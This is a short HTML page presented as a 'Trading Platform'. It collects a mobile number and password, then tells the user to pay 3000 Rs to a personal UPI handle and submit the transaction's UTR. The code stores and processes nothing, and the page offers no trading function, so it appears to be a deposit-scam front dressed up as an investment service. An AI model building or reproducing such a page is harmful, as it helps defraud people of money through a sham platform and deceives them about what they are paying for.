<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trading Platform</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            color: #333;
        }
        label {
            display: block;
            margin: 10px 0 5px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        .info {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }
    </style>
</head>
<body>
    <!-- Sign-In Page -->
    <div class="container" id="sign-in-page">
        <h1>Create Account</h1>
        <form id="sign-in-form">
            <label for="mobile">Enter Your 10-Digit Indian Mobile Number</label>
            <input type="text" id="mobile" name="mobile" maxlength="10" required>

            <label for="password">Enter Your Password</label>
            <input type="password" id="password" name="password" required>

            <label for="confirm-password">Confirm Your Password</label>
            <input type="password" id="confirm-password" name="confirm-password" required>

            <button type="button" onclick="createAccount()">Create Account</button>
        </form>
    </div>

    <!-- Payment Page -->
    <div class="container" id="payment-page" style="display: none;">
        <h1>Make Payment</h1>
        <p>Your Current Balance is <strong>0 Rs</strong></p>
        <p>Add Balance: <strong>3000 Rs</strong></p>
        <p>Payment Details:</p>
        <p><strong>Payment Here: zrlmods111@ybl</strong></p>

        <label for="utr">Enter 12-Digit UTR</label>
        <input type="text" id="utr" name="utr" maxlength="12" required>

        <button type="button" onclick="submitPayment()">Submit Payment</button>
        <div class="info">Please ensure you use the correct UTR for successful verification.</div>
    </div>

    <script>
        function createAccount() {
            const mobile = document.getElementById('mobile').value;
            const password = document.getElementById('password').value;
            const confirmPassword = document.getElementById('confirm-password').value;

            if (password !== confirmPassword) {
                alert('Passwords do not match!');
                return;
            }

            if (mobile.length !== 10 || isNaN(mobile)) {
                alert('Please enter a valid 10-digit mobile number!');
                return;
            }

            alert('Account created successfully! Redirecting to payment page.');
            document.getElementById('sign-in-page').style.display = 'none';
            document.getElementById('payment-page').style.display = 'block';
        }

        function submitPayment() {
            const utr = document.getElementById('utr').value;

            if (utr.length !== 12 || isNaN(utr)) {
                alert('Please enter a valid 12-digit UTR!');
                return;
            }

            alert('Payment submitted successfully!');
        }
    </script>
</body>
</html>
